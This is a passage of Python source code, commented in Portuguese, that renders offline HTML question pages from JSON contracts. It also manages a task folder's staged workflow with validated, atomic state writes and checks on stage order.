    return f'''<details class="q-item{"" if reversivel else " is-irrev"}" id="item-{id_interno}" data-pergunta-id="{identificador}" data-idx="{indice}">
<summary class="q-row">
<span class="q-num" aria-hidden="true">{indice + 1}</span>
<span class="q-main">
{selo_inicio}<span class="q-title">{do_contrato(pergunta.get("pergunta", ""))}</span>
<span class="q-line2"><span class="q-impact">{do_contrato(pergunta.get("impacto_curto", ""))}</span><span class="q-outcome" hidden></span></span>
<span class="q-line3"><span class="q-sug">Sugestão: <strong>{do_contrato(recomendada.get("titulo", ""))}</strong></span><span class="q-dotsep" aria-hidden="true">·</span><span>{do_contrato(len(opcoes))} opções</span><span class="q-dotsep" aria-hidden="true">·</span>{linha_rev}</span>
</span>
<span class="q-side">
<span class="q-annot" hidden>{BALAO}<span class="q-annot-n">0</span><span class="sr-only"> anotações neste item</span></span>
<span class="status-chip">Falta responder</span>
</span>
{CHEVRON_GRILL}
</summary>
<div class="q-home">
<article class="q-card" id="card-{id_interno}" data-pergunta-id="{identificador}" aria-labelledby="card-title-{id_interno}">
<h3 class="card-title" id="card-title-{id_interno}">{do_contrato(pergunta.get("pergunta", ""))}</h3>
{bloco_contexto}
<div class="wz-block">
<div class="block-label">O que muda na prática</div>
<p class="card-impact" data-anotavel data-bloco-id="{identificador}::impacto">{do_contrato(pergunta.get("impacto_curto", ""))}</p>
{nota_rev}
</div>{callout}
<fieldset class="options">
<legend class="block-label">As opções — a sugerida vem destacada; só vale quando você responder</legend>
<div class="options-list">
{chr(10).join(_opcao_em_html(pergunta, o, indice, j) for j, o in enumerate(opcoes))}
</div>
</fieldset>
<div class="wz-block">
<div class="block-label">Sua resposta</div>
<div class="answer-row">
<div class="state-buttons" role="group" aria-label="Resposta sobre a pergunta {indice + 1}">{botoes}</div>
<div class="duvida-box" hidden>
<label for="duvida-{id_interno}">Qual é a dúvida?</label>
<textarea id="duvida-{id_interno}" class="duvida-texto" maxlength="{limite_duvida}" placeholder="Se não souber descrever, deixe em branco"></textarea>
<p class="duvida-hint">Pode ficar em branco: só de marcar a dúvida, a pergunta já volta mais bem explicada na próxima rodada. O que você escrever aqui fica guardado mesmo se você mudar de resposta.</p>
</div>
</div>
<div class="decision-help" id="help-{id_interno}" role="status" aria-live="polite">{esc(AJUDA_PENDENTE)}</div>
<button type="button" class="reset-answer" hidden>Apagar minha resposta (volta a “falta responder”)</button>
<div class="field">
<label for="comentario-{id_interno}">Comentário (opcional)</label>
<textarea id="comentario-{id_interno}" class="question-comment" maxlength="{limite_comentario}" placeholder="Condição, exceção ou contexto que a resposta sozinha não conta"></textarea>
<p class="field-hint">Comentário viaja junto com a resposta e muda o que será feito. Para um bilhete sobre o texto, selecione o trecho e toque em “Anotar”.</p>
</div>
</div>
<details class="evidence">
<summary>De onde veio esta pergunta</summary>
<div class="evidence-body">
{bloco_origem}<p class="mono" style="margin-top:6px">Pergunta {do_contrato(pergunta.get("id", ""))} · rodada {do_contrato(rodada)} · contrato grill-rodada-v1</p>
</div>
</details>
</article>
</div>
</details>'''

def _linha_de_conferencia(pergunta: dict, indice: int) -> str:
    return (f'<li data-pergunta-id="{esc(pergunta.get("id", ""))}"><button type="button">'
            f'<span class="cf-num">{indice + 1}</span>'
            f'<span class="cf-q">{do_contrato(pergunta.get("pergunta", ""))}</span>'
            f'<span class="cf-a cf-pend"><strong>Falta responder</strong></span>'
            f'</button></li>')

def render_grill(contrato: dict) -> str:
    """Monta a rodada de grill a partir do contrato `grill-rodada-v1`.

    Mesmas garantias da página de direções: determinístico, offline, identidade
    byte-preservada, dado do contrato sempre escapado e nunca dentro de seletor."""
    sha = sha_do_contrato(contrato)     # proveniência: o contrato como ele entrou
    documento = json.loads(json.dumps(contrato))
    if "rodada" not in documento:
        fail("não dá para renderizar o grill: o campo obrigatório 'rodada' está ausente")
    rodada = documento["rodada"]
    documento["export"] = bloco_de_export(documento, "grill-respostas-v1",
                                          f"grill-rodada-{rodada}")
    corpo = texto_do_contrato(documento).replace("</", "<\\/")

    perguntas = documento.get("perguntas") or []
    quantas = len(perguntas)
    plural = "1 pergunta" if quantas == 1 else f"{quantas} perguntas"
    tarefa = documento.get("tarefa") or {}
    titulo = "Perguntas para fechar o entendimento · Rodada %s" % rodada
    if tarefa.get("pergunta_original"):
        titulo += " · %s" % tarefa["pergunta_original"]
    rdate = f"Rodada {do_contrato(rodada)} de perguntas"
    if documento.get("gerado_em"):
        rdate += " · %s" % do_contrato(str(documento["gerado_em"])[:10])

    linha_tarefa = ""
    if tarefa.get("pergunta_original") or tarefa.get("direcao_escolhida"):
        partes = []
        if tarefa.get("pergunta_original"):
            partes.append("<strong>Tarefa:</strong> “%s”" % do_contrato(tarefa["pergunta_original"]))
        if tarefa.get("direcao_escolhida"):
            partes.append("<strong>Direção escolhida:</strong> %s"
                          % do_contrato(tarefa["direcao_escolhida"]))
        linha_tarefa = '<p class="task-line">%s</p>' % " · ".join(partes)

    rodape = (f'<p class="foot-note">Página gerada pelo motor temcomo (versão {ENGINE_VERSION}) '
              f"a partir do contrato '{do_contrato(documento.get('tarefa_id', ''))}'. Ela "
              f"funciona offline, não faz nenhum acesso externo e não executa nenhuma ação: as "
              f"respostas só saem daqui pelos botões de copiar ou baixar.</p>\n"
              f'    <div class="mono">Contrato: '
              f'{do_contrato(documento["export"]["schema_version"])} · SHA-256 do '
              f'contrato em forma canônica, com as chaves ordenadas: '
              f"{do_contrato(sha)}</div>\n"
              f'    <div class="mono">Identidade QualiApps embutida: tipografia e logotipo '
              f"viajam dentro do arquivo, para a página abrir sem internet.</div>")

    valores = {
        "%%TOKENS%%": ler_recurso(PASTA_DE_ASSETS / "tokens-grill.css"),
        "%%FONTS%%": ler_recurso(PASTA_DE_ASSETS / "fontes.css"),
        "%%LOGO_SRC%%": ler_recurso(PASTA_DE_ASSETS / "logo-qualiapps.txt").strip(),
        "%%PROVENIENCIA%%": f"<!-- temcomo engine v{ENGINE_VERSION} · contrato sha256 {sha} -->",
        "%%CONTRATO_SHA%%": sha,
        "%%MAX_ANOTACAO%%": str(limite_de_texto("grill-respostas-v1",
                                                "anotacoes", [], "comentario")),
        "%%LIMITES_DE_TEXTO%%": json.dumps({
            "comentario": limite_de_texto("grill-respostas-v1", "respostas", [], "comentario"),
            "duvida": limite_de_texto("grill-respostas-v1", "respostas", [], "duvida_texto"),
            "anotacao": limite_de_texto("grill-respostas-v1", "anotacoes", [], "comentario"),
        }, ensure_ascii=False, sort_keys=True),
        "%%CONTRATO_JSON%%": corpo,
        "%%TITULO%%": esc(titulo),
        "%%TAREFA_ID%%": esc(documento.get("tarefa_id", "")),
        "%%RODADA%%": esc(rodada),
        "%%SCHEMA_EXPORT%%": esc(documento["export"]["schema_version"]),
        "%%RID%%": "%s · %s" % (do_contrato(documento.get("tarefa_id", "")),
                                do_contrato(documento["export"]["schema_version"])),
        "%%RDATE%%": rdate,
        "%%EYEBROW%%": "Perguntas para fechar o entendimento · rodada %s" % do_contrato(rodada),
        "%%TITULO_HERO%%": "Responda as %s desta rodada" % do_contrato(plural),
        "%%LINHA_TAREFA%%": linha_tarefa,
        "%%ARIA_LISTA%%": esc(f"As {plural} desta rodada"),
        "%%CONTAGEM_INICIAL%%": "0 de %s respondidas" % do_contrato(quantas),
        "%%PROGRESSO_INICIAL%%": ("0 de %s respondidas — faltam %s"
                                  % (do_contrato(quantas), do_contrato(quantas))),
        "%%TOTAL_PERGUNTAS_ATR%%": esc(quantas),
        "%%TOTAL_PERGUNTAS_TEXTO%%": do_contrato(quantas),
        "%%FAIXA_EXEMPLO%%": faixa_de_exemplo(documento),
        "%%RODAPE%%": rodape,
        "%%PERGUNTAS%%": "\n".join(_pergunta_em_html(p, i, rodada)
                                    for i, p in enumerate(perguntas)),
        "%%LINHAS_CONFERENCIA%%": "\n".join(_linha_de_conferencia(p, i)
                                            for i, p in enumerate(perguntas)),
    }
    pagina = ler_recurso(PASTA_DE_TEMPLATES / "grill.html.tpl")
    for marca, valor in valores.items():
        pagina = pagina.replace(marca, valor)
    sobrando = re.findall(r"%%[A-Z_]+%%", pagina)
    if sobrando:
        fail(f"o template ficou com marcação sem preencher: {', '.join(sorted(set(sobrando)))}")
    return pagina

RENDERIZADORES = {"direcoes-v1": (render_direcoes, "direcoes"),
                  "grill-rodada-v1": (render_grill, "grill-rodada")}

def renderizar_contrato(caminho) -> Path:
    """Valida o contrato, escolhe o renderizador pela versão e grava em `html/NN-*.html`,
    numerando na sequência — render antigo é registro, nunca é sobrescrito (spec §9)."""
    caminho = Path(caminho)
    contrato = carregar_e_validar(caminho)
    versao = contrato["schema_version"]
    if versao not in RENDERIZADORES:
        fail(f"não há página para o contrato '{versao}' — sabem virar página: "
             f"{', '.join(repr(v) for v in RENDERIZADORES)}")
    render, apelido = RENDERIZADORES[versao]
    pagina = render(contrato)
    if versao == "grill-rodada-v1":
        apelido = f"{apelido}-{contrato['rodada']}"

    pasta = caminho.parent.parent if caminho.parent.name == "contratos" else caminho.parent
    destino = pasta / "html"
    try:
        destino.mkdir(parents=True, exist_ok=True)
        numeros = [int(m.group(1)) for x in destino.glob("*.html")
                   if (m := re.match(r"^(\d+)-", x.name))]
        numero = max(numeros, default=0) + 1
    except OSError as e:
        fail(f"não consegui usar a pasta '{citar(destino)}' — {motivo_do_sistema(e)}")
    arquivo = destino / f"{numero:02d}-{apelido}.html"
    while arquivo.exists():          # nunca sobrescreve, mesmo com numeração torta
        numero += 1
        arquivo = destino / f"{numero:02d}-{apelido}.html"
    escrever_texto(arquivo, pagina)
    return arquivo

def cmd_renderizar(args):
    arquivo = renderizar_contrato(args.contrato)
    print(f"Página gerada em '{citar(arquivo)}'.\n"
          f"Abra com dois cliques — ela funciona sem internet e não executa nada: "
          f"só registra a sua escolha.")

# ————— a pasta da tarefa e a máquina de estados da jornada (spec §5 e §9) —————

ETAPAS = ("criada", "objetivo-confirmado", "pesquisa-concluida", "direcao-escolhida",
          "grill-concluido")

# O que cada avanço exige: arquivo, contrato e o que a etapa significa em PT-BR leigo.
GATE_DA_ETAPA = {
    "objetivo-confirmado": ("contratos/01-objetivo.json", "objetivo-v1",
                            "o objetivo escrito como resultado e confirmado por você"),
    "pesquisa-concluida": ("contratos/02-pesquisa.json", "pesquisa-v1",
                           "a pesquisa do que já existe, com fonte e limite de cada achado"),
    "direcao-escolhida": ("respostas/decisao-direcoes.json", "decisao-direcoes-v1",
                          "a sua escolha de caminho, feita na página de direções"),
    "grill-concluido": ("contratos/04-grill-consolidado.json", "grill-consolidado-v1",
                        "o consolidado do grill, com cobertura suficiente e zero dúvida aberta"),
}

SUBPASTAS_DA_TAREFA = ("contratos", "html", "respostas", "pesquisas")

def slugificar(texto: str) -> str:
    """Nome de pasta a partir do objetivo: sem acento, sem símbolo e sem como escapar
    do diretório (barra e ponto-ponto viram separador, nunca caminho)."""
    sem_acento = "".join(c for c in unicodedata.normalize("NFD", str(texto))
                         if unicodedata.category(c) != "Mn")
    pedaços = re.split(r"[^a-z0-9]+", sem_acento.lower())
    slug = "-".join(p for p in pedaços if p)[:60].strip("-")
    return slug or "tarefa"

def instante_de(texto):
    """O instante que um carimbo do contrato representa, ou None se não for legível.

    Comparar carimbos como TEXTO seria errado: '2026-08-21T15:00:00+00:00' vem depois de
    '2026-08-21T10:00:00-04:00' no alfabeto, e os dois são o mesmo momento. Datas sem
    fuso são tratadas como um mesmo fuso implícito — comparar entre si é o que importa."""
    if not isinstance(texto, str):
        return None
    bruto = texto.strip()
    if re.fullmatch(r"\d{4}-\d{2}-\d{2}", bruto):
        bruto += "T00:00:00"
    bruto = re.sub(r"[Zz]$", "+00:00", bruto)
    try:
        momento = datetime.datetime.fromisoformat(bruto)
    except ValueError:
        return None
    if momento.tzinfo is None:
        momento = momento.replace(tzinfo=datetime.timezone.utc)
    return momento

def agora_iso(data=None) -> str:
    """Instante em texto. Com `--data`, vira determinístico (o autoteste depende disso);
    sem ele, é o único uso do relógio fora do render."""
    if data:
        texto = str(data)
        # Só o dia vira meia-noite; duas etapas do mesmo dia empatavam no histórico e
        # a ordem virava indistinguível. Com hora, a jornada fica ordenável de verdade.
        if re.fullmatch(r"\d{4}-\d{2}-\d{2}", texto):
            try:
                datetime.date.fromisoformat(texto)    # 31 de fevereiro não existe
            except ValueError:
                fail(f"data inexistente no calendário: '{citar(texto)}' — confira o dia e "
                     f"o mês")
            return f"{texto}T00:00:00"
        if instante_de(texto) is None:
            fail(f"data inválida: '{citar(texto)}' — use AAAA-MM-DD ou o instante completo, "
                 f"como 2026-08-21T14:30:00")
        return texto
    return datetime.datetime.now().astimezone().isoformat(timespec="seconds")

def pasta_de_tarefas(raiz=None) -> Path:
    return Path(raiz or Path.cwd()) / ".temcomo" / "tarefas"

def criar_tarefa(raiz, objetivo: str, data=None, produzido_por=None) -> Path:
    """Cria `.temcomo/tarefas/<slug>-<data>/` com o registro inicial da jornada."""
    if _em_branco(objetivo):
        fail("o objetivo da tarefa não pode ficar em branco — escreva em uma linha o que "
             "você quer conseguir")
    quando = agora_iso(data)
    tarefa_id = f"{slugificar(objetivo)}-{quando[:10]}"
    raiz_das_tarefas = pasta_de_tarefas(raiz)
    pasta = raiz_das_tarefas / tarefa_id
    # Só olhar o caminho já pode falhar (nome comprido demais, atalho em círculo…):
    # a sondagem também precisa passar pelo tradutor (achado r3/2).
    try:
        for ancestral in (Path(raiz or Path.cwd()), raiz_das_tarefas):
            if ancestral.exists() and not ancestral.is_dir():
                fail(f"'{citar(ancestral)}' não é uma pasta — informe uma pasta em '--raiz'")
        ja_existe = pasta.exists()
    except OSError as e:
        fail(f"não consegui usar o caminho '{citar(pasta)}' — {motivo_do_sistema(e)}")
    if ja_existe:
        fail(f"já existe uma tarefa em '{citar(pasta)}' — use outro objetivo, outra data, ou "
             f"continue a que está aberta com: temcomo status {citar(pasta)}")
    registro = {
        "schema_version": "tarefa-v1",
        "tarefa_id": tarefa_id,
        "gerado_em": quando,
        "produzido_por": dict(produzido_por or {}) or {
            "agente": "temcomo (motor)", "modelo": NAO_DETERMINAVEL,
            "sessao_id": NAO_DETERMINAVEL, "transcript_jsonl": NAO_DETERMINAVEL},
        "etapa": "criada",
        "objetivo_resumido": str(objetivo)[:300],
        "criada_em": quando,
        "historico": [{"etapa": "criada", "em": quando, "por": "temcomo (motor)"}],
    }
    # Valida ANTES de tocar no disco e publica de uma vez só: criação recusada não pode
    # deixar pasta pela metade nem bloquear a tentativa corrigida (achado r1/P1-5).
    validar_documento_carregado(registro, str(pasta / "tarefa.json"))
    rascunho = None
    try:
        raiz_das_tarefas.mkdir(parents=True, exist_ok=True)
        rascunho = Path(tempfile.mkdtemp(prefix=".parcial-", dir=raiz_das_tarefas))
        for sub in SUBPASTAS_DA_TAREFA:
            (rascunho / sub).mkdir()
        escrever_texto(rascunho / "tarefa.json",
                       json.dumps(registro, ensure_ascii=False, indent=2) + "\n")
        rascunho.rename(pasta)
    except SystemExit:
        # `escrever_texto` já traduziu e bloqueou: aqui só limpamos antes de deixar
        # a mesma decisão seguir adiante — rascunho não vira lixo (achado r3/3).
        if rascunho is not None:
            shutil.rmtree(rascunho, ignore_errors=True)
        raise
    except OSError as e:
        if rascunho is not None:
            shutil.rmtree(rascunho, ignore_errors=True)
        fail(f"não consegui criar a pasta da tarefa em '{citar(pasta)}' — {motivo_do_sistema(e)}")
    return pasta

def gravar_tarefa(pasta: Path, registro: dict) -> dict:
    """Grava o registro só depois de ele passar pelo próprio contrato — o motor não
    escreve estado que ele mesmo recusaria na leitura.

    A publicação é atômica: escreve num arquivo temporário irmão, fecha com sucesso e
    só então troca o arquivo com `os.replace()`. Disco cheio no meio da escrita suja o
    temporário, nunca o registro que já existia (achado r3/1)."""
    alvo = pasta / "tarefa.json"
    validar_documento_carregado(registro, str(alvo))
    texto = json.dumps(registro, ensure_ascii=False, indent=2) + "\n"
    temporario = None
    try:
        descritor, caminho = tempfile.mkstemp(prefix=".tarefa-", suffix=".json", dir=str(pasta))
        os.close(descritor)
        temporario = Path(caminho)
        temporario.write_text(texto, encoding="utf-8")
        os.replace(str(temporario), str(alvo))   # troca atômica, mesmo sistema de arquivos
        temporario = None
    except OSError as e:
        if temporario is not None:
            temporario.unlink(missing_ok=True)   # some só o temporário; o anterior fica
        fail(f"não consegui gravar '{citar(alvo)}' — {motivo_do_sistema(e)}")
    return registro

def carregar_tarefa(pasta) -> dict:
    pasta = Path(pasta)
    arquivo = pasta / "tarefa.json"
    if not arquivo.exists():
        fail(f"'{citar(pasta)}' não parece uma pasta de tarefa do temcomo — não encontrei o "
             f"arquivo 'tarefa.json' lá dentro")
    conferir_pasta_da_tarefa(pasta)
    registro = carregar_e_validar(arquivo)      # inclui a coerência do histórico
    conferir_jornada_no_disco(pasta, registro)
    return registro

def resolver_tarefa(alvo=None, raiz=None) -> Path:
    """Aceita o caminho da pasta ou o nome da tarefa; sem alvo, resolve sozinho só
    quando não há dúvida possível (uma única tarefa aberta)."""
    try:
        if alvo:
            caminho = Path(alvo)
            if (caminho / "tarefa.json").exists():
                return caminho
            por_nome = pasta_de_tarefas(raiz) / alvo
            if (por_nome / "tarefa.json").exists():
                return por_nome
            fail(f"não encontrei a tarefa '{citar(alvo)}' — informe o caminho da pasta dela ou o nome "
                 f"que aparece em '{citar(pasta_de_tarefas(raiz))}'")
        for ancestral in (Path(raiz or Path.cwd()), pasta_de_tarefas(raiz)):
            if ancestral.exists() and not ancestral.is_dir():
                fail(f"'{citar(ancestral)}' não é uma pasta — informe uma pasta em '--raiz'")
        existentes = sorted(p for p in pasta_de_tarefas(raiz).glob("*")
                            if (p / "tarefa.json").exists())
    except OSError as e:      # sondar o caminho também pode falhar (achado r3/2)
        fail(f"não consegui usar o caminho informado — {motivo_do_sistema(e)}")
    if not existentes:
        fail(f"nenhuma tarefa aberta em '{citar(pasta_de_tarefas(raiz))}' — comece com: "
             f"temcomo nova-tarefa \"o que você quer conseguir\"")
    if len(existentes) > 1:
        # montada por concatenação, com `citar` visível em cada item: dentro de uma
        # f-string o gate não teria como ver que os nomes já foram neutralizados
        fail("há mais de uma tarefa aberta; diga qual:\n  - "
             + "\n  - ".join(citar(p.name) for p in existentes))
    return existentes[0]

def _tentar(funcao, *args, **kwargs):
    """Roda algo que normalmente bloqueia o programa e devolve (resultado, motivo).
    Serve para consultar um gate sem derrubar o processo — o `status` precisa saber
    o motivo, não morrer com ele."""
    saida = io.StringIO()
    try:
        with contextlib.redirect_stderr(saida):
            return funcao(*args, **kwargs), None
    except SystemExit:
        motivo = saida.getvalue().strip()
        return None, motivo[len("ERRO: "):] if motivo.startswith("ERRO: ") else motivo

def avaliar_gate(pasta, etapa: str, registro: dict):
    """(satisfeito, motivo) — **a** fonte de verdade do gate: a **ordem** da jornada
    *e* o contrato da etapa, nesta ordem. `concluir-etapa` e `status` leem daqui, então
    não têm como divergir — nem sobre o contrato (r1/P1-3) nem sobre a vez de cada etapa
    (r2/P1). Só a próxima etapa pode ser declarada pronta."""
    atual = registro.get("etapa")
    if etapa not in ETAPAS:
        return False, (f"etapa desconhecida: '{etapa}'{_sugestao(etapa, ETAPAS)} — as etapas "
                       f"são: {', '.join(repr(e) for e in ETAPAS)}")
    if atual not in ETAPAS:
        return False, f"a tarefa está em uma etapa que não existe: '{atual}'"
    posicao_atual, posicao = ETAPAS.index(atual), ETAPAS.index(etapa)
    if posicao <= posicao_atual:
        seguinte = (repr(ETAPAS[posicao_atual + 1]) if posicao_atual + 1 < len(ETAPAS)
                    else "nenhuma, a jornada terminou")
        return False, (f"'{etapa}' já ficou para trás: a tarefa está em '{atual}' e a jornada "
                       f"só anda para frente. Próxima etapa: {seguinte}")
    if posicao > posicao_atual + 1:
        antes = ", ".join(repr(e) for e in ETAPAS[posicao_atual + 1:posicao])
        return False, f"aguarda a conclusão de {antes} — a jornada anda uma etapa por vez"
    return avaliar_contrato_da_etapa(pasta, etapa, registro.get("tarefa_id"))

# ————— quem pode tocar em arquivo, e quem lê resposta (gate estrutural) —————
#
# O padrão das três revisões da decisão 20 foi sempre o mesmo: um leitor esquecido. Em vez
# de procurar a palavra "respostas" no texto das funções — que o revisor furou com
# concatenação, `open`, `os.scandir` e até um comentário —, a régua é o MECANISMO: para ler
# qualquer coisa é preciso passar por uma destas primitivas, e só a lista abaixo pode.
PRIMITIVAS_DE_LEITURA = ("ler_json", "carregar_e_validar", "read_text", "read_bytes",
                         "open", "iterdir", "glob", "rglob", "scandir", "listdir")

# Funções autorizadas a tocar em arquivo. Entrar aqui é ato deliberado e revisável.
PORTADORES_DE_LEITURA = (
    "_conferir_direcao_escolhida", "_conferir_resposta_contra_origem", "_rodadas_na_pasta",
    "_sha_do_arquivo", "calcular_oraculo", "carregar_e_validar", "carregar_oraculo",
    "carregar_resposta_guardada", "carregar_schema", "carregar_tarefa", "cmd_validar",
    "conferir_respostas_de_grill_guardadas", "ecos_crus_no_motor", "importar_resposta",
    "ler_fonte_do_motor", "ler_json", "ler_recurso", "paginas_para_checagem",
    "provas_de_campo_obrigatorio", "provas_de_fora_da_caixa", "reconciliar_grill",
    "renderizar_contrato", "resolver_tarefa",
)

# Dos portadores, os que leem RESPOSTA: cada um tem de chamar uma régua de verdade.
# `cmd_validar` fica fora de propósito — a spec §7 define `validar` como conferência de
# formato de um arquivo solto, sem pasta de tarefa contra a qual comparar.
LEITORES_DE_RESPOSTA = (
    "carregar_resposta_guardada", "conferir_respostas_de_grill_guardadas",
    "importar_resposta", "_conferir_resposta_contra_origem",
)

def ler_fonte_do_motor() -> str:
    """O código do motor sem a bateria de testes — é sobre ele que os gates raciocinam."""
    bruto = Path(__file__).read_text(encoding="utf-8")
    return bruto[:bruto.index(chr(10) + "class Test")]

def carregar_resposta_guardada(pasta: Path, arquivo: Path, tarefa: dict) -> dict:
    """Lê uma resposta que já está em `respostas/` — e a confere contra o contrato de AGORA.

    Porta única de LEITURA. A conferência semântica (`_conferir_resposta_contra_origem`)
    já era única para quem *importa*; duas revisões seguidas mostraram que isso não basta,
    porque quem *relê* entrava por outro lado: primeiro a retomada, depois
    `avaliar_contrato_da_etapa`, que avançava a etapa e ainda dizia "com o contrato
    conferido". O erro não foi o leitor esquecido — foi a conferência morar no chamador.
    Agora mora no ponto de leitura, e quem ler uma resposta confere sem escolher."""
    dado = carregar_e_validar(arquivo)
    versao = dado.get("schema_version")
    if versao in DESTINO_DA_RESPOSTA:
        _conferir_resposta_contra_origem(
            pasta, dado, tarefa, versao, dado.get("rodada"),
            origem=f"a resposta guardada em '{citar(arquivo.name)}'")
    return dado

def avaliar_contrato_da_etapa(pasta, etapa: str, tarefa_id: str):
    """(satisfeito, motivo) só do contrato, sem olhar a ordem — é o que a conferência
    do disco precisa para reavaliar etapas **já** concluídas."""
    caminho_relativo, versao, significado = GATE_DA_ETAPA[etapa]
    arquivo = Path(pasta) / caminho_relativo
    if not arquivo.exists():
        return False, f"falta o arquivo '{caminho_relativo}' (contrato '{versao}')"
    dado, motivo = _tentar(carregar_resposta_guardada, Path(pasta), arquivo,
                           {"tarefa_id": tarefa_id})
    if dado is None:
        return False, f"'{caminho_relativo}' não passou na conferência — {motivo}"
    if dado.get("schema_version") != versao:
        return False, (f"'{caminho_relativo}' é um contrato '{dado.get('schema_version')}', "
                       f"mas esta etapa precisa de um '{versao}'")
    if dado.get("tarefa_id") != tarefa_id:
        return False, (f"'{caminho_relativo}' tem tarefa_id '{dado.get('tarefa_id')}', que não "
                       f"é o desta tarefa ('{tarefa_id}') — contrato de outra tarefa não vale aqui")
    if etapa == "direcao-escolhida" and dado.get("estado") != "decidida":
        return False, (f"a escolha de direção ainda está '{dado.get('estado')}' — falta você "
                       f"escolher um caminho na página de direções")
    if etapa == "grill-concluido":
        veredito = (dado.get("cobertura") or {}).get("veredito")
        if veredito != "SUFICIENTE":
            return False, (f"o grill ainda não fechou: a cobertura está '{veredito}' e "
                           f"precisa ser 'SUFICIENTE'")
    return True, None

def _erros_de_ordem_no_tempo(historico: list) -> list:
    """A jornada não anda para trás.

    Um histórico que retrocede descreve algo que não aconteceu — e era por aí que uma
    tarefa remendada à mão passava pelos gates de ordem, que só olhavam a sequência de
    etapas. Empate é aceito: duas etapas podem cair no mesmo instante, sobretudo quando
    `--data` traz só o dia."""
    erros, anterior, rotulo_anterior = [], None, None
    for i, passo in enumerate(historico):
        if not isinstance(passo, dict):
            continue
        momento = instante_de(passo.get("em"))
        if momento is None:
            continue          # formato do carimbo já é cobrado pela definição
        if anterior is not None and momento < anterior:
            erros.append(f"$.historico[{i}].em: a jornada anda para trás — "
                         f"{_resumo(passo.get('em'), 40)} vem antes de "
                         f"{_resumo(rotulo_anterior, 40)}, que já estava registrado")
        if anterior is None or momento >= anterior:
            anterior, rotulo_anterior = momento, passo.get("em")
    return erros

def erros_de_coerencia_da_jornada(dado) -> list:
    """O registro da tarefa precisa contar uma história possível. Sem isto, editar
    `etapa` na mão pula todos os gates (achado r1/P1-1): o histórico tem de ser o
    começo exato da jornada, terminar na etapa atual e citar o contrato de cada avanço."""
    etapa = dado.get("etapa")
    historico = dado.get("historico")
    if etapa not in ETAPAS or not isinstance(historico, list) or not historico:
        return []          # forma inválida já foi acusada pela definição do formato
    erros_do_tempo = _erros_de_ordem_no_tempo(historico)
    if erros_do_tempo:
        return erros_do_tempo
    passos = [p.get("etapa") for p in historico if isinstance(p, dict)]
    if len(passos) != len(historico):
        return []
    esperado = list(ETAPAS[:len(passos)])
    if passos != esperado:
        return [f"$.historico: a jornada registrada não bate com a ordem das etapas — "
                f"esperava {esperado}, veio {passos}. A tarefa avança uma etapa por vez, "
                f"pelo subcomando 'concluir-etapa'"]
    if passos[-1] != etapa:
        return [f"$.etapa: o registro diz '{etapa}', mas o último passo do histórico é "
                f"'{passos[-1]}' — etapa e histórico precisam contar a mesma história"]
    erros = []
    for i, passo in enumerate(historico[1:], start=1):
        exigido = GATE_DA_ETAPA[passos[i]][0]
        if passo.get("contrato") != exigido:
            erros.append(f"$.historico[{i}].contrato: o avanço para '{passos[i]}' precisa citar "
                         f"'{exigido}', veio {_resumo(passo.get('contrato'), 60)}")
    return erros

def conferir_pasta_da_tarefa(pasta: Path) -> None:
    """A pasta precisa continuar inteira, não só ter nascido inteira (achado r1/P1-2)."""
    for sub in SUBPASTAS_DA_TAREFA:
        alvo = pasta / sub
        if not alvo.exists():
            fail(f"a pasta da tarefa está incompleta: falta a subpasta '{sub}' em '{citar(pasta)}' — "
                 f"recrie a subpasta antes de continuar")
        if not alvo.is_dir():
            fail(f"'{sub}' precisa ser uma subpasta em '{citar(pasta)}', mas é um arquivo — "
                 f"a pasta da tarefa está corrompida")

def conferir_jornada_no_disco(pasta: Path, registro: dict) -> None:
    """Cada etapa já dada precisa continuar sustentada pelo contrato que a autorizou.
    Fecha o resto do r1/P1-1: histórico coerente com contratos que sumiram não vale."""
    for passo in registro.get("historico", [])[1:]:
        etapa = passo.get("etapa")
        if etapa not in GATE_DA_ETAPA:
            continue
        satisfeito, motivo = avaliar_contrato_da_etapa(pasta, etapa, registro.get("tarefa_id"))
        if not satisfeito:
            fail(f"o registro da tarefa diz que '{etapa}' foi concluída, mas o contrato que "
                 f"autorizou isso não se sustenta: {motivo}")
    # As respostas do grill não têm etapa própria em `GATE_DA_ETAPA` — quem as fecha é o
    # consolidado. Sem esta linha, uma rodada respondida ficava fora de toda releitura.
    conferir_respostas_de_grill_guardadas(Path(pasta), registro)

def avancar_etapa(pasta, nova_etapa: str, data=None, por: str = "temcomo (motor)") -> dict:
    """Avança uma única casa na jornada, e só com o contrato daquela etapa validado.
    Fail-closed: etapa desconhecida, fora de ordem, contrato ausente, inválido ou de
    outra tarefa bloqueiam sem tocar no estado gravado."""
    pasta = Path(pasta)
    tarefa = carregar_tarefa(pasta)
    satisfeito, motivo = avaliar_gate(pasta, nova_etapa, tarefa)
    if not satisfeito:
        if nova_etapa in GATE_DA_ETAPA:
            fail(f"para concluir '{nova_etapa}': {motivo}.\nÉ ali que fica "
                 f"{GATE_DA_ETAPA[nova_etapa][2]}")
        fail(f"para concluir '{nova_etapa}': {motivo}")
    caminho_relativo = GATE_DA_ETAPA[nova_etapa][0]

    quando = agora_iso(data)
    tarefa["etapa"] = nova_etapa
    tarefa["gerado_em"] = quando
    tarefa["historico"] = list(tarefa.get("historico", [])) + [
        {"etapa": nova_etapa, "em": quando, "por": por, "contrato": caminho_relativo}]
    return gravar_tarefa(pasta, tarefa)

# ————— importar a devolução do usuário (spec §5 e §9) —————

# Onde cada export é guardado e o que ele fecha na jornada.
DESTINO_DA_RESPOSTA = {
    "decisao-direcoes-v1": ("respostas/decisao-direcoes.json", "direcao-escolhida"),
    "grill-respostas-v1": ("respostas/grill-rodada-{rodada}.json", None),
}

def contrato_da_rodada(pasta: Path, rodada) -> Path:
    return pasta / "contratos" / f"04-grill-rodada-{rodada}.json"

def _numero_no_nome(nome: str, padrao: str):
    casado = re.match(padrao, nome)
    return int(casado.group(1)) if casado else None

def _conferir_vinculo(corpo: dict, arquivo: Path, tarefa: dict, rodada=None) -> None:
    """Todo artefato do grill precisa dizer de quem é e de que rodada é — e bater com o
    nome que carrega. Nome de arquivo não é prova de conteúdo."""
    if corpo.get("tarefa_id") != tarefa["tarefa_id"]:
        fail(f"'{citar(arquivo.name)}' está na pasta desta tarefa mas diz pertencer a "
             f"{_resumo(corpo.get('tarefa_id'), 60)} — arquivo de outra tarefa aqui dentro é "
             f"sinal de pasta misturada; tire-o daqui antes de continuar")
    if rodada is not None and corpo.get("rodada") != rodada:
        fail(f"'{citar(arquivo.name)}' se chama rodada {rodada}, mas por dentro diz ser da rodada "
             f"{_resumo(corpo.get('rodada'), 20)} — enquanto os dois não combinarem eu não "
